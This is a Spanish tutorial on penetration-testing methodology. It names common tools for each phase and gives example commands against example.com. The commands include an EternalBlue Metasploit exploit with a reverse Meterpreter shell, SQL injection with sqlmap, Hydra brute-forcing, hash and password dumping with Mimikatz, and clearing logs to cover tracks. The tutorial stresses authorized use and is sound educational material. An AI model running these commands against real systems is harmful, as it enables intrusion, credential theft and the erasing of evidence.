# Metodología de test o ataque informático

En un ataque informático, cada fase de la metodología tiene herramientas específicas que se pueden utilizar para cumplir los objetivos de esa etapa. Veamos las herramientas más comunes para cada una de las fases:

### 1. **Reconocimiento (Reconnaissance)**
   - **Objetivo**: Recopilar información sobre el objetivo sin interactuar directamente con él (reconocimiento pasivo) o con una interacción mínima (reconocimiento activo).
   - **Herramientas**:
     - **Reconocimiento Pasivo**:
       - **WHOIS**: Información sobre la propiedad de dominios.
       - **DNSdumpster**: Mapeo de registros DNS.
       - **theHarvester**: Recolección de correos electrónicos, subdominios, y más.
       - **Shodan**: Información sobre dispositivos y servicios expuestos.
       - **Censys**: Similar a Shodan para descubrimiento de infraestructura.
       - **Google Dorks**: Uso de operadores avanzados de Google para obtener información específica.
     - **Reconocimiento Activo**:
       - **Nmap**: Descubrimiento de hosts y servicios.
       - **Amass**: Enumeración avanzada de subdominios.
       - **Dirb/Gobuster**: Fuerza bruta en directorios y archivos web.
       - **Metasploit (auxiliares)**: Módulos de escaneo y recolección.

### 2. **Escaneo (Scanning)**
   - **Objetivo**: Identificar y analizar puertos abiertos, servicios en ejecución, y posibles vulnerabilidades.
   - **Herramientas**:
     - **Nmap**: Escaneo de puertos, detección de versiones y sistemas operativos.
     - **OpenVAS**: Escaneo de vulnerabilidades a nivel de red y sistema.
     - **Nikto**: Escaneo de vulnerabilidades en servidores web.
     - **SQLmap**: Detección y explotación de vulnerabilidades SQL Injection.
     - **Wpscan**: Escaneo de vulnerabilidades en sitios WordPress.

### 3. **Explotación (Exploitation)**
   - **Objetivo**: Comprometer el sistema objetivo explotando vulnerabilidades descubiertas.
   - **Herramientas**:
     - **Metasploit Framework**: Ejecución de exploits para vulnerabilidades conocidas.
     - **SQLmap**: Explotación automatizada de SQL Injection.
     - **Hydra**: Fuerza bruta en servicios de autenticación.
     - **BeEF**: Explotación de vulnerabilidades en navegadores web.
     - **Burp Suite**: Exploits manuales y automatizados en aplicaciones web.
     - **XSSer**: Explotación de vulnerabilidades XSS en aplicaciones web.

### 4. **Post-explotación (Post-exploitation)**
   - **Objetivo**: Mantener el acceso, escalar privilegios, y obtener más información sensible.
   - **Herramientas**:
     - **Meterpreter (Metasploit)**: Ejecución de comandos, captura de datos, escalación de privilegios.
     - **Empire**: Framework de post-explotación para PowerShell y Python.
     - **Mimikatz**: Extracción de contraseñas y hashes en sistemas Windows.
     - **BloodHound**: Análisis de relaciones y privilegios en Active Directory.
     - **Privilege Escalation Exploits**: Como **Dirty COW**, **Kernel exploits** específicos para escalar privilegios en sistemas vulnerables.

### 5. **Análisis (Analysis)**
   - **Objetivo**: Revisar la información obtenida, analizar las vulnerabilidades explotadas, y los impactos potenciales.
   - **Herramientas**:
     - **Wireshark**: Análisis de tráfico de red capturado.
     - **Volatility**: Análisis forense de la memoria.
     - **Splunk**: Recolección y análisis de logs.
     - **Autopsy**: Herramienta de análisis forense para discos y archivos.
     - **Binwalk**: Análisis y extracción de datos de archivos binarios y firmwares.

### 6. **Borrado de huellas (Covering Tracks)**
   - **Objetivo**: Eliminar evidencias de la intrusión para evitar la detección y atribución.
   - **Herramientas**:
     - **Metasploit (Meterpreter)**: Comandos para limpiar logs y eliminar rastros.
     - **Logcleaner**: Scripts para eliminar entradas específicas en logs.
     - **Shred**: Comando en Unix/Linux para eliminar archivos permanentemente.
     - **dd**: Utilizado para borrar datos en dispositivos de almacenamiento.
     - **Clearev** (Meterpreter): Limpia los logs de eventos en Windows.

### 7. **Reporte (Reporting)**
   - **Objetivo**: Documentar todo el proceso del ataque, incluyendo las vulnerabilidades encontradas, los métodos de explotación, y las recomendaciones.
   - **Herramientas**:
     - **Dradis**: Plataforma para la colaboración y generación de reportes en pruebas de seguridad.
     - **Faraday**: IDE colaborativo para reportar hallazgos de pruebas de seguridad.
     - **KeepNote**: Herramienta para tomar notas y organizar información durante pruebas de penetración.
     - **CherryTree**: Editor de notas jerárquico con soporte para reportes estructurados.
     - **LaTeX**: Para generar reportes profesionales con alta personalización en formato PDF.

Estas herramientas son fundamentales en cada una de las fases de un ataque informático y te permitirán realizar el trabajo de forma más eficiente y efectiva. Es crucial utilizar estas herramientas con fines éticos y siempre bajo un marco de autorización y legalidad.

## Ejemplo paso a paso

Como hemos visto cada fase requiere un enfoque específico y herramientas seleccionadas que nos permitan llevar a cabo el trabajo de forma efectiva. Estos ejemplos son una guía básica que puedes ajustar según las necesidades y el entorno especifico en el que trabajes. Recuerda siempre realizar estas actividades de manera ética y legal, obteniendo el consentimiento adecuado cuando sea necesario.

### 1. **Reconocimiento (Reconnaissance)**

**Objetivo**: Recopilar información sobre el objetivo sin interactuar directamente con él (reconocimiento pasivo) o con una interacción mínima (reconocimiento activo).

#### Ejemplo 1: WHOIS
- **Comando**: `whois example.com`
- **Resultado**: Obtendrás información sobre el propietario del dominio, fechas de registro y expiración, servidores DNS, etc.

#### Ejemplo 2: theHarvester
- **Comando**: `theharvester -d example.com -b google`
- **Resultado**: Recopilará correos electrónicos, subdominios y otros datos públicos de `example.com` usando Google como fuente.

#### Ejemplo 3: Shodan
- **Comando**: `shodan search "apache port:80"`
- **Resultado**: Encontrarás servidores web Apache expuestos en el puerto 80, con información detallada de IP, ubicación, y servicios expuestos.

### 2. **Escaneo (Scanning)**

**Objetivo**: Identificar y analizar puertos abiertos, servicios en ejecución, y posibles vulnerabilidades.

#### Ejemplo 1: Nmap
- **Comando**: `nmap -sS -sV -O example.com`
- **Resultado**: Realizará un escaneo SYN para descubrir puertos abiertos, identificará las versiones de los servicios y tratará de determinar el sistema operativo del objetivo.

#### Ejemplo 2: Nikto
- **Comando**: `nikto -h http://example.com`
- **Resultado**: Escaneará `example.com` en busca de vulnerabilidades conocidas en el servidor web.

#### Ejemplo 3: Wpscan
- **Comando**: `wpscan --url http://example.com --enumerate u`
- **Resultado**: Enumerará los usuarios de WordPress en `example.com`, útil para ataques de fuerza bruta posteriores.

### 3. **Explotación (Exploitation)**

**Objetivo**: Comprometer el sistema objetivo explotando vulnerabilidades descubiertas.

#### Ejemplo 1: Metasploit Framework
- **Comando**:
  ```bash
  msfconsole
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOSTS example.com
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST your_ip
  exploit
  ```
- **Resultado**: Si `example.com` es vulnerable a `EternalBlue`, abrirá una sesión Meterpreter en el sistema comprometido.

#### Ejemplo 2: SQLmap
- **Comando**: `sqlmap -u "http://example.com/index.php?id=1" --dbs`
- **Resultado**: Detectará y explotará una vulnerabilidad SQL Injection en `example.com`, listando las bases de datos disponibles.

#### Ejemplo 3: Hydra
- **Comando**: `hydra -l admin -P /path/to/passwords.txt ftp://example.com`
- **Resultado**: Intentará una fuerza bruta de la cuenta `admin` en un servidor FTP de `example.com` usando la lista de contraseñas proporcionada.

### 4. **Post-explotación (Post-exploitation)**

**Objetivo**: Mantener el acceso, escalar privilegios, y obtener más información sensible.

#### Ejemplo 1: Meterpreter (Metasploit)
- **Comando**:
  ```bash
  getuid
  sysinfo
  hashdump
  ```
- **Resultado**: Obtendrás información sobre el usuario y el sistema comprometido, y extraerás hashes de contraseñas para un ataque de fuerza bruta fuera de línea.

#### Ejemplo 2: Mimikatz
- **Comando**:
  ```bash
  mimikatz
  sekurlsa::logonpasswords
  ```
- **Resultado**: Recuperará contraseñas en texto claro y hashes de la memoria en sistemas Windows.

#### Ejemplo 3: BloodHound
- **Comando**:
  ```bash
  import-module .\SharpHound.ps1
  Invoke-BloodHound -CollectionMethod All
  ```
- **Resultado**: Recopilará datos sobre la infraestructura de Active Directory, ayudándote a identificar rutas para la escalación de privilegios.

### 5. **Análisis (Analysis)**

**Objetivo**: Revisar la información obtenida, analizar las vulnerabilidades explotadas, y los impactos potenciales.

#### Ejemplo 1: Wireshark
- **Comando**: Capturar tráfico en la interfaz `eth0`: `wireshark`
- **Resultado**: Analizarás las capturas de tráfico de red para detectar credenciales sin cifrar, sesiones no seguras, etc.

#### Ejemplo 2: Volatility
- **Comando**: `volatility -f memory.dump --profile=Win7SP1x64 pslist`
- **Resultado**: Listará los procesos en ejecución en una imagen de memoria, útil para detectar malware o procesos sospechosos.

#### Ejemplo 3: Binwalk
- **Comando**: `binwalk firmware.bin`
- **Resultado**: Analizará y extraerá componentes de un archivo binario, como un firmware, para buscar vulnerabilidades o entender su funcionamiento.

### 6. **Borrado de huellas (Covering Tracks)**

**Objetivo**: Eliminar evidencias de la intrusión para evitar la detección y atribución.

#### Ejemplo 1: Meterpreter (Metasploit)
- **Comando**:
  ```bash
  clearev
  ```
- **Resultado**: Limpiará los registros de eventos en el sistema Windows comprometido.

#### Ejemplo 2: Shred (Linux)
- **Comando**: `shred -u -n 5 sensitive_file.txt`
- **Resultado**: Sobrescribirá el archivo `sensitive_file.txt` varias veces y lo eliminará, dificultando su recuperación.

#### Ejemplo 3: Logcleaner
- **Comando**: Un script personalizado para eliminar entradas específicas de los logs, basado en patrones de búsqueda.
- **Resultado**: Las entradas de log que corresponden a tus actividades se eliminarán o modificarán.

### 7. **Reporte (Reporting)**

**Objetivo**: Documentar todo el proceso del ataque, incluyendo las vulnerabilidades encontradas, los métodos de explotación, y las recomendaciones.

#### Ejemplo 1: Dradis
- **Comando**: Iniciar Dradis y crear un proyecto nuevo. Importar resultados desde herramientas como Nmap, Nikto, Metasploit, etc.
- **Resultado**: Crearás un informe estructurado que incluya todos los hallazgos, con la posibilidad de colaborar con otros miembros del equipo.

#### Ejemplo 2: CherryTree
- **Comando**: Abrir CherryTree y organizar tus notas jerárquicamente por fase (Reconocimiento, Escaneo, Explotación, etc.).
- **Resultado**: Tendrás un documento organizado y detallado que puede exportarse en diferentes formatos para reportes.

#### Ejemplo 3: LaTeX
- **Comando**: Crear un archivo `.tex` para el reporte y compilarlo en un PDF.
- **Resultado**: Generarás un informe profesional con alta personalización en formato PDF.

---

